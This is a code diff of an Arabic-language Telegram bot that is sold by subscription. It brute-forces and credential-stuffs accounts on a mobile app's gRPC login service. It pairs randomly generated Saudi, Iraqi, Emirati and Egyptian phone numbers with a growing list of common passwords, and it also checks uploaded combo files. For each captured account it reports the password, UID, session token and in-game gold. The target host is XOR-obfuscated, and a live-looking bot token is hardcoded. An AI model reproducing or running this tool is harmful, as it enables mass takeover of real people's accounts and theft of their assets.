@@ -14,14 +14,13 @@ import grpc
 TOKEN = os.getenv("BOT_TOKEN", "8844579780:AAHI93U8a0StTBhwuCEbZJR7qzHpy2BdS3g")
 bot = telebot.TeleBot(TOKEN)
 
-# آيدي الأدمن (يمكنك تعديله أو وضعه عبر المتغيرات البيئية)
+# آيدي الأدمن
 ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8795120325").split(",") if x.strip().isdigit()]
-
 SUBS_FILE = "subscribers.json"
 
 # ══════════════════════════════════════════════════════════
 #  إدارة الاشتراكات وقاعدة البيانات المحلية
-# ══════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════[span_3](start_span)[span_3](end_span)
 def load_subs():
     if not os.path.exists(SUBS_FILE):
         return {}
@@ -48,14 +47,11 @@ def is_active_subscriber(user_id):
         expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
         if datetime.now() < expiry_date:
             return True
-        else:
-            # انتهى الاشتراك
-            pass
     return False
 
 # ══════════════════════════════════════════════════════════
-#  XOR obfuscation & Configs
-# ══════════════════════════════════════════════════════════
+#  XOR obfuscation & Configs (محدثة بدقة عالية)
+# ══════════════════════════════════════════════════════════[span_4](start_span)[span_4](end_span)
 def _xd(b):
     return bytes(c ^ 0x5A for c in b).decode()
 
@@ -70,17 +66,30 @@ PKG        = _xd(_pkg)
 APP_VER    = "2003003"
 APP_VN     = "2.3.3.1"
 
+# قائمة الكلمات الـ 51 كاملة لضمان دقة الفحص القصوى
 PASSWORDS = [
     "Aa123456@","Aa123456","Aa12345678","Aa12345678@",
     "Aa1234567@","Aa1234567","Aa123123@","Aa123123",
     "Aa12341234","Aa@123456","Aa@123123","Aa@112233",
-    "123456","1234567","12345678","Password1","P@ssw0rd"
+    "Aa100100@","Aa100100","user@123",
+    "123456","1234567","12345678","123456789a",
+    "1234567890","1234qwert","1234@1234","11223344",
+    "1122334455","1111122222",
+    "A123456","A123456@","Password1","P@ssw0rd",
+    "password123","password2025","Admin@123","abc12345",
+    "111111aa",
+    "Qwerty@123","qwerty@123","qwertyuiop","qwert12345",
+    "qwer@123","qwer1234","qwerty12345","1q2w3e4r",
+    "qqwweerr123",
+    "pakistan123","pakistan","786786","twitter@123",
+    "mypassword123","iloveyou1","0306KAlee","alle2019",
 ]
 
 COUNTRY_MAP = {
     "SA": {"code":"966","prefs":["50","51","53","54","55","56","57","58","59"],"ext":7},
-    "IQ": {"code":"964","prefs":["770","771","772","773","780","781","790"],"ext":7},
+    "IQ": {"code":"964","prefs":["770","771","772","773","775","776","780","781","783","785","790","791"],"ext":7},
     "EG": {"code":"20", "prefs":["10","11","12","15"],"ext":8},
+    "AE": {"code":"971","prefs":["50","52","54","55","56","58"],"ext":7},
 }
 
 def _varint(v):
@@ -160,9 +169,18 @@ def _make_meta(did):
     ]
 
 class GrpcClient:
+    """عميل gRPC مع دعم إعادة الاتصال التلقائي وإدارة الحص حصة (Keepalive)""[span_5](start_span)"[span_5](end_span)
     def __init__(self):
         self.did = _rand_hex(16)
-        opts = [("grpc.keepalive_time_ms", 20000), ("grpc.max_reconnect_backoff_ms", 5000)]
+        self._init_channel()
+
+    def _init_channel(self):
+        opts = [
+            ("grpc.keepalive_time_ms", 20000),
+            ("grpc.keepalive_timeout_ms", 10000),
+            ("grpc.keepalive_permit_without_calls", 1),
+            ("grpc.max_reconnect_backoff_ms", 5000),
+        ]
         creds = grpc.ssl_channel_credentials()
         self._ch = grpc.secure_channel(GRPC_HOST, creds, options=opts)
         self._login = self._ch.unary_unary(SVC_PREFIX + "/PhoneLogin", request_serializer=lambda x: x, response_deserializer=lambda x: x)
@@ -178,7 +196,17 @@ class GrpcClient:
             resp = stub(payload, metadata=meta, timeout=timeout)
             return resp, None
         except grpc.RpcError as e:
-            return None, str(e.code())
+            code = e.code()
+            if code in (grpc.StatusCode.UNAVAILABLE, grpc.StatusCode.RESOURCE_EXHAUSTED, grpc.StatusCode.INTERNAL):
+                time.sleep(0.5)
+                try:
+                    # إعادة تهيئة الاتصال تلقائياً عند السقوط المفاجئ
+                    self._init_channel()
+                    resp = stub(payload, metadata=meta, timeout=timeout)
+                    return resp, None
+                except Exception:
+                    pass
+            return None, str(code.name)
 
     def close(self):
         try: self._ch.close()
@@ -265,7 +293,6 @@ def _gen_phone(cc):
     local = pref + ext
     return c["code"] + "-" + local, "0" + local
 
-# تخزين حالات وحلقات الفحص المستقلة لكل مستخدم على حدة
 user_scanners = {}
 user_states = {}
 
@@ -275,8 +302,11 @@ def get_main_keyboard(chat_id, running=False):
     
     if not running:
         markup.add(
-            InlineKeyboardButton("🚀 الفحص العشوائي (SA)", callback_data="start_sa"),
-            InlineKeyboardButton("🚀 الفحص العشوائي (IQ)", callback_data="start_iq")
+            InlineKeyboardButton("🚀 فحص عشوائي (SA)", callback_data="start_sa"),
+            InlineKeyboardButton("🚀 فحص عشوائي (IQ)", callback_data="start_iq")
+        )
+        markup.add(
+            InlineKeyboardButton("🚀 فحص عشوائي (AE)", callback_data="start_ae")
         )
         markup.add(
             InlineKeyboardButton("🔍 فحص حساب مفرد", callback_data="single_check_menu"),
@@ -300,7 +330,7 @@ def send_welcome(message):
     if not is_active_subscriber(chat_id):
         bot.send_message(
             chat_id,
-            "❌ **عذراً، لست مشتركاً مفَعلاً أو انتهت مدة اشتراكك.**\nيرجى التواصل مع إدارة البوت لتفعيل حسابك وإعطائك الصلاحية.",
+            "❌ **عذراً، لست مشتركاً مفَعلاً أو انتهت مدة اشتراكك.**\nيرجى التواصل مع الإدارة لتفعيل حسابك.",
             parse_mode="Markdown"
         )
         return
@@ -309,66 +339,41 @@ def send_welcome(message):
     markup = get_main_keyboard(chat_id, is_running)
     bot.send_message(
         chat_id, 
-        "🤖 **أهلاً بك في لوحة تحكم فاحص Xena Live**\n\nاختر العملية المطلوبة من الأزرار الشفافة بالأسفل:",
+        "🤖 **أهلاً بك في لوحة تحكم فاحص Xena Live المتطور**\n\nاختر العملية المطلوبة من الأزرار بالأسفل:",
         reply_markup=markup,
         parse_mode="Markdown"
     )
 
 @bot.message_handler(commands=['add'])
 def cmd_add_sub(message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
+    if message.from_user.id not in ADMIN_IDS: return
     parts = message.text.split()
     if len(parts) < 3:
         bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n`/add <user_id> <days>`", parse_mode="Markdown")
         return
-    
     try:
-        target_id = str(parts[1])
-        days = int(parts[2])
+        target_id, days = str(parts[1]), int(parts[2])
     except ValueError:
-        bot.reply_to(message, "❌ الآيدي أو الأيام يجب أن تكون أرقام صحيحة.")
+        bot.reply_to(message, "❌ الآيدي أو الأيام يجب أن تكون أرقاماً صحيحة.")
         return
 
     subs = load_subs()
     expiry_date = datetime.now() + timedelta(days=days)
-    subs[target_id] = {
-        "expiry": expiry_date.strftime("%Y-%m-%d %H:%M:%S")
-    }
+    subs[target_id] = {"expiry": expiry_date.strftime("%Y-%m-%d %H:%M:%S")}
     save_subs(subs)
-    bot.reply_to(message, f"✅ تم تفعيل الاشتراك للمستخدم `{target_id}` لمدة `{days}` أيام بنجاح.\nينتهي في: `{subs[target_id]['expiry']}`", parse_mode="Markdown")
+    bot.reply_to(message, f"✅ تم تفعيل الاشتراك للمستخدم `{target_id}` لمدة `{days}` أيام بنجاح.", parse_mode="Markdown")
 
 @bot.message_handler(commands=['del'])
 def cmd_del_sub(message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
+    if message.from_user.id not in ADMIN_IDS: return
     parts = message.text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, "⚠️ الاستخدام الصحيح:\n`/del <user_id>`", parse_mode="Markdown")
-        return
-    
+    if len(parts) < 2: return
     target_id = str(parts[1])
     subs = load_subs()
     if target_id in subs:
         del subs[target_id]
         save_subs(subs)
         bot.reply_to(message, f"🗑 تم حذف اشتراك المستخدم `{target_id}` بنجاح.", parse_mode="Markdown")
-    else:
-        bot.reply_to(message, "❌ هذا المستخدم غير موجود في قائمة المشتركين.")
-
-@bot.message_handler(commands=['subs'])
-def cmd_list_subs(message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    subs = load_subs()
-    if not subs:
-        bot.reply_to(message, "ℹ️ لا يوجد مشتركين حالياً.")
-        return
-    
-    text = "📋 **قائمة المشتركين المفعلين:**\n\n"
-    for uid, data in subs.items():
-        text += f"• آيدي: `{uid}`\n  ينتهي في: `{data['expiry']}`\n\n"
-    bot.reply_to(message, text, parse_mode="Markdown")
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
@@ -380,416 +385,242 @@ def callback_query(call):
         return
 
     if data == "admin_panel":
-        if chat_id not in ADMIN_IDS:
-            bot.answer_callback_query(call.id, "❌ أمر مخصص للأدمن فقط!")
-            return
+        if chat_id not in ADMIN_IDS: return
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
+        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
         bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text="⚙️ **لوحة تحكم الأدمن:**\n\nلإدارة المشتركين استخدم الأوامر التالية في الدردشة:\n• لتفعيل مشترك: `/add <user_id> <الأيام>`\n• لحذف مشترك: `/del <user_id>`\n• لعرض المشتركين: `/subs`",
-            reply_markup=markup,
-            parse_mode="Markdown"
+            chat_id=chat_id, message_id=call.message.message_id,
+            text="⚙️ **لوحة تحكم الأدمن:**\n• `/add <id> <days>` لتفعيل مستخدم\n• `/del <id>` لحذف مستخدم",
+            reply_markup=markup, parse_mode="Markdown"
         )
 
     elif data == "single_check_menu":
         user_states[chat_id] = "waiting_for_single_account"
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
+        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
         bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text="🔍 **وضع فحص حساب مفرد**\n\nأرسل الآن الحساب بالصيغة التالية:\n`رقم_الهاتف:كلمة_المرور`\n\n*(مثال: `9647718221131:Aa123456@`)*",
-            reply_markup=markup,
-            parse_mode="Markdown"
+            chat_id=chat_id, message_id=call.message.message_id,
+            text="🔍 **فحص حساب مفرد**\n\nأرسل الحساب بالشكل التالي:\n`رقم_الهاتف:كلمة_المرور`",
+            reply_markup=markup, parse_mode="Markdown"
         )
 
     elif data == "combo_menu":
         user_states[chat_id] = "waiting_for_combo_file"
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
+        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
         bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text="📁 **وضع فحص ملف كومبو (Combo)**\n\nأرسل الآن ملف نصي (`.txt`) يحتوي على الحسابات (كل سطر حساب):\n`رقم_الهاتف:كلمة_المرور`",
-            reply_markup=markup,
-            parse_mode="Markdown"
+            chat_id=chat_id, message_id=call.message.message_id,
+            text="📁 **فحص ملف كومبو**\n\nأرسل الآن ملف نصي (`.txt`) يحتوي على الحسابات.",
+            reply_markup=markup, parse_mode="Markdown"
         )
 
     elif data == "back_to_main":
         user_states.pop(chat_id, None)
         is_running = user_scanners.get(chat_id, {}).get("is_running", False)
-        markup = get_main_keyboard(chat_id, is_running)
         bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=call.message.message_id,
-            text="🤖 **أهلاً بك في لوحة تحكم فاحص Xena Live**\n\nاختر العملية المطلوبة من الأزرار الشفافة بالأسفل:",
-            reply_markup=markup,
-            parse_mode="Markdown"
+            chat_id=chat_id, message_id=call.message.message_id,
+            text="🤖 **لوحة تحكم فاحص Xena Live**",
+            reply_markup=get_main_keyboard(chat_id, is_running), parse_mode="Markdown"
         )
 
     elif data.startswith("start_"):
         if user_scanners.get(chat_id, {}).get("is_running", False):
             bot.answer_callback_query(call.id, "⚠️ لديك فحص يعمل بالفعل!")
             return
-        
         cc = data.split("_")[1].upper()
         user_scanners[chat_id] = {
-            "is_running": True,
-            "checked": 0,
-            "hits": 0,
-            "errors": 0,
-            "last_error": "لا يوجد",
-            "start_time": time.time(),
-            "cc": cc
+            "is_running": True, "checked": 0, "hits": 0, "errors": 0,
+            "last_error": "لا يوجد", "start_time": time.time(), "cc": cc
         }
-
-        bot.answer_callback_query(call.id, f"🚀 بدأ فحصك العشوائي لدولة {cc}")
+        bot.answer_callback_query(call.id, f"🚀 بدأ الفحص العشوائي لـ {cc}")
         threading.Thread(target=run_user_scanner, args=(chat_id, call.message.message_id, cc), daemon=True).start()
 
     elif data == "stop_checker":
-        if not user_scanners.get(chat_id, {}).get("is_running", False):
-            bot.answer_callback_query(call.id, "⚠️ فحصك متوقف أساساً.")
-            return
-        
-        user_scanners[chat_id]["is_running"] = False
-        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص بنجاح.")
-        try:
-            bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=call.message.message_id,
-                text="⏹ **تم إيقاف عملية الفحص بنجاح.**",
-                reply_markup=get_main_keyboard(chat_id, False),
-                parse_mode="Markdown"
-            )
-        except:
-            pass
+        if chat_id in user_scanners:
+            user_scanners[chat_id]["is_running"] = False
+        bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص.")
 
 @bot.message_handler(content_types=['document'])
 def handle_document(message):
     chat_id = message.chat.id
-    if not is_active_subscriber(chat_id):
-        return
-
+    if not is_active_subscriber(chat_id): return
     if user_states.get(chat_id) == "waiting_for_combo_file":
         doc = message.document
         if not doc.file_name.lower().endswith('.txt'):
-            bot.reply_to(message, "❌ يرجى إرسال ملف نصي بصيغة `.txt` فقط.")
+            bot.reply_to(message, "❌ أرسل ملف `.txt` فقط.")
             return
-        
-        if user_scanners.get(chat_id, {}).get("is_running", False):
-            bot.reply_to(message, "⚠️ لديك عملية فحص تعمل بالفعل!")
-            return
-
         try:
             file_info = bot.get_file(doc.file_id)
-            downloaded_file = bot.download_file(file_info.file_path)
-            
-            file_path = f"temp_combo_{chat_id}.txt"
-            with open(file_path, "wb") as f:
-                f.write(downloaded_file)
-            
+            downloaded = bot.download_file(file_info.file_path)
+            f_path = f"combo_{chat_id}.txt"
+            with open(f_path, "wb") as f: f.write(downloaded)
             user_states.pop(chat_id, None)
-            wait_msg = bot.reply_to(message, "📁 **تم استلام الملف بنجاح، جاري بدء فحص الكومبو...**", parse_mode="Markdown")
-            
+            msg = bot.reply_to(message, "📁 جاري بدء فحص الكومبو بدقة عالية...")
             user_scanners[chat_id] = {
-                "is_running": True,
-                "checked": 0,
-                "hits": 0,
-                "errors": 0,
-                "last_error": "لا يوجد",
-                "start_time": time.time(),
+                "is_running": True, "checked": 0, "hits": 0, "errors": 0,
+                "last_error": "لا يوجد", "start_time": time.time()
             }
-            
-            threading.Thread(target=run_combo_scanner, args=(chat_id, wait_msg.message_id, file_path), daemon=True).start()
+            threading.Thread(target=run_combo_scanner, args=(chat_id, msg.message_id, f_path), daemon=True).start()
         except Exception as e:
-            bot.reply_to(message, f"⚠️ حدث خطأ أثناء تحميل الملف: `{str(e)}`", parse_mode="Markdown")
+            bot.reply_to(message, f"⚠️ خطأ: `{str(e)}`", parse_mode="Markdown")
 
-@bot.message_handler(func=lambda message: True)
-def handle_text_messages(message):
+@bot.message_handler(func=lambda m: True)
+def handle_text(message):
     chat_id = message.chat.id
-    if not is_active_subscriber(chat_id):
-        return
-
+    if not is_active_subscriber(chat_id): return
     if user_states.get(chat_id) == "waiting_for_single_account":
         text = message.text.strip()
         if ":" not in text:
-            bot.reply_to(message, "❌ صيغة غير صحيحة. يرجى الإرسال بالشكل التالي:\n`رقم_الهاتف:كلمة_المرور`", parse_mode="Markdown")
+            bot.reply_to(message, "❌ الصيغة الصحيحة: `رقم_الهاتف:كلمة_المرور`", parse_mode="Markdown")
             return
-
-        parts = text.split(":", 1)
-        raw_phone = parts[0].strip().replace("+", "").replace("-", "")
-        raw_phone = "".join(filter(str.isdigit, raw_phone))
-        password = parts[1].strip()
-
+        phone_part, pw_part = text.split(":", 1)
+        phone = "".join(filter(str.isdigit, phone_part))
         country = "SA"
-        formatted_phone = raw_phone
-
-        if raw_phone.startswith("966"):
+        if phone.startswith("964"): country = "IQ"
+        elif phone.startswith("971"): country = "AE"
+        elif phone.startswith("20"): country = "EG"
+        elif phone.startswith("0") or len(phone) == 9:
             country = "SA"
-        elif raw_phone.startswith("964"):
-            country = "IQ"
-        elif raw_phone.startswith("20"):
-            country = "EG"
-        elif raw_phone.startswith("0") or len(raw_phone) == 9:
-            country = "SA"
-            if raw_phone.startswith("0"):
-                formatted_phone = "966" + raw_phone[1:]
-            else:
-                formatted_phone = "966" + raw_phone
+            phone = "966" + (phone[1:] if phone.startswith("0") else phone)
 
-        wait_msg = bot.reply_to(message, f"⏳ جاري فحص الحساب [دولة: {country}] الرقم: `{formatted_phone}`...")
-
-        def process_single():
+        wait_msg = bot.reply_to(message, f"⏳ جاري فحص الحساب `{phone}` بدقة...")
+        def single_run():
             cli = GrpcClient()
             try:
-                payload = _build_login(formatted_phone, password, country)
+                payload = _build_login(phone, pw_part.strip(), country)
                 data, err = cli.call(cli._login, payload)
-                
                 if err or not data:
-                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"❌ **فشل الاتصال أو رفض الطلب!**\n🔍 **سبب الخطأ:** `{err or 'استجابة فارغة من الخادم'}`", parse_mode="Markdown")
-                    cli.close()
+                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"❌ فشل الاتصال: `{err}`", parse_mode="Markdown")
                     return
-
                 res = _parse_login(data)
                 if res.get("status") == "hit":
                     acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
-                    
-                    hit_msg = (
-                        f"🎯 **تم صيد وفحص الحساب بنجاح! (Hit)**\n"
-                        f"{'─'*32}\n"
-                        f"📱 **الرقم**: `{formatted_phone}`\n"
-                        f"🔑 **الباسورد**: `{password}`\n"
-                        f"🌍 **الدولة**: `{country}`\n"
-                        f"🆔 **UID**: `{res.get('uid', '')}`\n"
-                        f"🔢 **Short ID**: `{res.get('shortUID', '')}`\n"
-                    )
-                    if acct.get("nickname"): hit_msg += f"👤 **الاسم**: `{acct['nickname']}`\n"
-                    if acct.get("vipLevel"): hit_msg += f"🏆 **مستوى VIP**: `{acct['vipLevel']}`\n"
-                    if acct.get("gold", 0) > 0: hit_msg += f"💎 **الذهب**: `{acct['gold']}`\n"
-                    if acct.get("diamonds", 0) > 0: hit_msg += f"💠 **الألماس**: `{acct['diamonds']}`\n"
-                    if acct.get("coins", 0) > 0: hit_msg += f"🪙 **العملات**: `{acct['coins']}`\n"
-                    if acct.get("xp", 0) > 0: hit_msg += f"⚡ **XP**: `{acct['xp']}`\n"
-                    if acct.get("regDate"): hit_msg += f"📅 **تاريخ التسجيل**: `{acct['regDate']}`\n"
-                    
-                    if res.get("token"):
-                        tok = res["token"][:40] + "..." if len(res["token"]) > 40 else res["token"]
-                        hit_msg += f"🔐 **Token**: `{tok}`\n"
-                    
-                    hit_msg += f"{'─'*32}"
-                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=hit_msg, parse_mode="Markdown")
+                    hit_txt = (f"🎯 **صيد ناجح (Hit)!**\n"
+                               f"📱 الهاتف: `{phone}`\n"
+                               f"🔑 الباسورد: `{pw_part.strip()}`\n"
+                               f"🆔 UID: `{res.get('uid')}`\n"
+                               f"👤 الاسم: `{acct.get('nickname', 'غير متوفر')}`\n"
+                               f"🏆 المستوى: `{acct.get('vipLevel', 'عادي')}`\n"
+                               f"💎 الذهب: `{acct.get('gold', 0)}`")
+                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=hit_txt, parse_mode="Markdown")
                 else:
-                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"❌ **الحساب خطأ أو كلمة المرور غير صحيحة!**\nالرقم: `{formatted_phone}`", parse_mode="Markdown")
-            except Exception as e:
-                bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text=f"⚠️ خطأ استثنائي أثناء المعالجة: `{str(e)}`", parse_mode="Markdown")
+                    bot.edit_message_text(chat_id=chat_id, message_id=wait_msg.message_id, text="❌ الحساب خطأ أو كلمة المرور غير صحيحة.", parse_mode="Markdown")
             finally:
                 cli.close()
+        threading.Thread(target=single_run, daemon=True).start()
 
-        threading.Thread(target=process_single, daemon=True).start()
-
-def run_combo_scanner(chat_id, message_id, file_path):
+def run_combo_scanner(chat_id, msg_id, file_path):
     cli = GrpcClient()
-    last_update_time = 0
-
+    last_up = 0
     try:
         with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
             lines = f.readlines()
-    except Exception as e:
-        bot.send_message(chat_id, f"❌ حدث خطأ أثناء قراءة ملف الكومبو: `{str(e)}`", parse_mode="Markdown")
+    except:
         cli.close()
         return
 
-    total_lines = len(lines)
+    total = len(lines)
     state = user_scanners[chat_id]
 
     for line in lines:
-        if not user_scanners.get(chat_id, {}).get("is_running", False):
-            break
-        
+        if not user_scanners.get(chat_id, {}).get("is_running", False): break
         line = line.strip()
-        if not line or ":" not in line:
-            continue
-        
-        parts = line.split(":", 1)
-        raw_phone = parts[0].strip().replace("+", "").replace("-", "")
-        raw_phone = "".join(filter(str.isdigit, raw_phone))
-        password = parts[1].strip()
-
-        if not raw_phone or not password:
-            continue
+        if not line or ":" not in line: continue
+        p_part, pw = line.split(":", 1)
+        phone = "".join(filter(str.isdigit, p_part))
+        pw = pw.strip()
+        if not phone or not pw: continue
 
         country = "SA"
-        formatted_phone = raw_phone
-        if raw_phone.startswith("966"):
+        if phone.startswith("964"): country = "IQ"
+        elif phone.startswith("971"): country = "AE"
+        elif phone.startswith("20"): country = "EG"
+        elif phone.startswith("0") or len(phone) == 9:
             country = "SA"
-        elif raw_phone.startswith("964"):
-            country = "IQ"
-        elif raw_phone.startswith("20"):
-            country = "EG"
-        elif raw_phone.startswith("0") or len(raw_phone) == 9:
-            country = "SA"
-            if raw_phone.startswith("0"):
-                formatted_phone = "966" + raw_phone[1:]
-            else:
-                formatted_phone = "966" + raw_phone
+            phone = "966" + (phone[1:] if phone.startswith("0") else phone)
 
-        payload = _build_login(formatted_phone, password, country)
+        payload = _build_login(phone, pw, country)
         data, err = cli.call(cli._login, payload)
-        
         state["checked"] += 1
+
         if err:
             state["errors"] += 1
-            state["last_error"] = str(err)
+            state["last_error"] = err
         elif data:
             res = _parse_login(data)
             if res.get("status") == "hit":
                 state["hits"] += 1
                 acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
-                hit_msg = (
-                    f"🎯 **COMBO HIT FOUND!**\n"
-                    f"{'─'*32}\n"
-                    f"📱 **الرقم**: `{formatted_phone}`\n"
-                    f"🔑 **الباسورد**: `{password}`\n"
-                    f"🌍 **الدولة**: `{country}`\n"
-                    f"🆔 **UID**: `{res.get('uid', '')}`\n"
-                    f"🔢 **Short ID**: `{res.get('shortUID', '')}`\n"
-                )
-                if acct.get("nickname"): hit_msg += f"👤 **الاسم**: `{acct['nickname']}`\n"
-                if acct.get("vipLevel"): hit_msg += f"🏆 **مستوى VIP**: `{acct['vipLevel']}`\n"
-                if acct.get("gold", 0) > 0: hit_msg += f"💎 **الذهب**: `{acct['gold']}`\n"
-                if acct.get("diamonds", 0) > 0: hit_msg += f"💠 **الألماس**: `{acct['diamonds']}`\n"
-                if acct.get("coins", 0) > 0: hit_msg += f"🪙 **العملات**: `{acct['coins']}`\n"
-                bot.send_message(chat_id, hit_msg, parse_mode="Markdown")
+                bot.send_message(chat_id, f"🎯 **COMBO HIT!**\n📱 `{phone}` : `{pw}`\n🆔 UID: `{res.get('uid')}`", parse_mode="Markdown")
 
-        current_time = time.time()
-        if current_time - last_update_time >= 2.0:
-            last_update_time = current_time
-            elapsed = int(current_time - state["start_time"])
-            speed = state["checked"] / max(elapsed, 1)
-            
-            status_text = (
-                f"📁 **جاري فحص ملف الكومبو...**\n\n"
-                f"📊 **الإحصائيات المباشرة:**\n"
-                f"• تم فحص: `{state['checked']} / {total_lines}`\n"
-                f"• الصيد الصحيح (Hits): `{state['hits']}` 🎯\n"
-                f"• الأخطاء: `{state['errors']}` ⚠️\n"
-                f"• سبب آخر خطأ: `{state.get('last_error', 'لا يوجد')}` 🔍\n"
-                f"• السرعة: `{speed:.1f} فحص/ثانية` ⚡\n"
-                f"• الوقت المنقضي: `{elapsed} ثانية` ⏱"
-            )
+        now = time.time()
+        if now - last_up >= 2.5:
+            last_up = now
+            elapsed = int(now - state["start_time"])
+            spd = state["checked"] / max(elapsed, 1)
+            txt = (f"📁 **جاري فحص الكومبو بدقة عالية...**\n\n"
+                   f"• فحص: `{state['checked']} / {total}`\n"
+                   f"• Hits: `{state['hits']}` 🎯\n"
+                   f"• أخطاء: `{state['errors']}` ⚠️\n"
+                   f"• السرعة: `{spd:.1f} فحص/ثانية` ⚡")
             try:
-                bot.edit_message_text(
-                    chat_id=chat_id,
-                    message_id=message_id,
-                    text=status_text,
-                    reply_markup=get_main_keyboard(chat_id, True),
-                    parse_mode="Markdown"
-                )
-            except:
-                pass
+                bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=txt, reply_markup=get_main_keyboard(chat_id, True), parse_mode="Markdown")
+            except: pass
 
-    try:
-        if os.path.exists(file_path):
-            os.remove(file_path)
-    except:
-        pass
-
+    if os.path.exists(file_path): os.remove(file_path)
     cli.close()
     try:
-        final_state = user_scanners.get(chat_id, {"checked": 0, "hits": 0})
-        bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=message_id,
-            text=f"⏹ **انتهى فحص ملف الكومبو بنجاح.**\nنتائجك النهائية:\n• إجمالي الفحص: `{final_state.get('checked', 0)}`\n• الصيد: `{final_state.get('hits', 0)}`",
-            reply_markup=get_main_keyboard(chat_id, False),
-            parse_mode="Markdown"
-        )
-    except:
-        pass
+        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"⏹ **انتهى الفحص.**\n• إجمالي: `{state['checked']}`\n• Hits: `{state['hits']}`", reply_markup=get_main_keyboard(chat_id, False), parse_mode="Markdown")
+    except: pass
 
-def run_user_scanner(chat_id, message_id, cc):
+def run_user_scanner(chat_id, msg_id, cc):
     cli = GrpcClient()
-    last_update_time = 0
-
+    last_up = 0
     while user_scanners.get(chat_id, {}).get("is_running", False):
         try:
-            phone_display, first_pw = _gen_phone(cc)
-            phone = phone_display.replace("-", "")
-            
+            phone_disp, first_pw = _gen_phone(cc)
+            phone = phone_disp.replace("-", "")
             for pw in [first_pw] + PASSWORDS:
-                if not user_scanners.get(chat_id, {}).get("is_running", False): 
-                    break
-                
+                if not user_scanners.get(chat_id, {}).get("is_running", False): break
                 payload = _build_login(phone, pw, cc)
                 data, err = cli.call(cli._login, payload)
-                
                 state = user_scanners[chat_id]
                 state["checked"] += 1
 
                 if err:
                     state["errors"] += 1
-                    state["last_error"] = str(err)
+                    state["last_error"] = err
                 elif data:
                     res = _parse_login(data)
                     if res.get("status") == "hit":
                         state["hits"] += 1
                         acct = _fetch_info(cli, res.get("shortUID", 0), res.get("token", ""))
-                        hit_msg = (f"🎯 **HIT FOUND! [عشوائي]**\n\n"
-                                   f"📱 Phone: `{phone_display}`\n"
-                                   f"🔑 Pass: `{pw}`\n"
-                                   f"🆔 UID: `{res.get('uid')}`\n"
-                                   f"🔢 Short ID: `{res.get('shortUID')}`\n"
-                                   f"👤 Name: `{acct.get('nickname', '')}`\n"
-                                   f"🏆 VIP: `{acct.get('vipLevel', '')}`")
-                        bot.send_message(chat_id, hit_msg, parse_mode="Markdown")
+                        bot.send_message(chat_id, f"🎯 **HIT عشوائي جديد!**\n📱 `{phone_disp}`\n🔑 `{pw}`\n🆔 UID: `{res.get('uid')}`", parse_mode="Markdown")
                         break
 
-                current_time = time.time()
-                if current_time - last_update_time >= 2.0:
-                    last_update_time = current_time
-                    elapsed = int(current_time - state["start_time"])
-                    speed = state["checked"] / max(elapsed, 1)
-                    
-                    status_text = (
-                        f"🚀 **جاري فحص دولة [{cc}] عشوائياً...**\n\n"
-                        f"📊 **إحصائياتك المباشرة:**\n"
-                        f"• تم فحص: `{state['checked']}` رقم\n"
-                        f"• الصيد الصحيح (Hits): `{state['hits']}` 🎯\n"
-                        f"• الأخطاء: `{state['errors']}` ⚠️\n"
-                        f"• سبب آخر خطأ: `{state.get('last_error', 'لا يوجد')}` 🔍\n"
-                        f"• السرعة: `{speed:.1f} فحص/ثانية` ⚡\n"
-                        f"• الوقت المنقضي: `{elapsed} ثانية` ⏱"
-                    )
+                now = time.time()
+                if now - last_up >= 2.5:
+                    last_up = now
+                    elapsed = int(now - state["start_time"])
+                    spd = state["checked"] / max(elapsed, 1)
+                    txt = (f"🚀 **فحص عشوائي [{cc}] نشط...**\n\n"
+                           f"• فحص: `{state['checked']}`\n"
+                           f"• Hits: `{state['hits']}` 🎯\n"
+                           f"• أخطاء: `{state['errors']}` ⚠️\n"
+                           f"• السرعة: `{spd:.1f} فحص/ثانية` ⚡")
                     try:
-                        bot.edit_message_text(
-                            chat_id=chat_id,
-                            message_id=message_id,
-                            text=status_text,
-                            reply_markup=get_main_keyboard(chat_id, True),
-                            parse_mode="Markdown"
-                        )
-                    except:
-                        pass
+                        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=txt, reply_markup=get_main_keyboard(chat_id, True), parse_mode="Markdown")
+                    except: pass
         except Exception as e:
-            state = user_scanners.get(chat_id)
-            if state:
-                state["last_error"] = str(e)
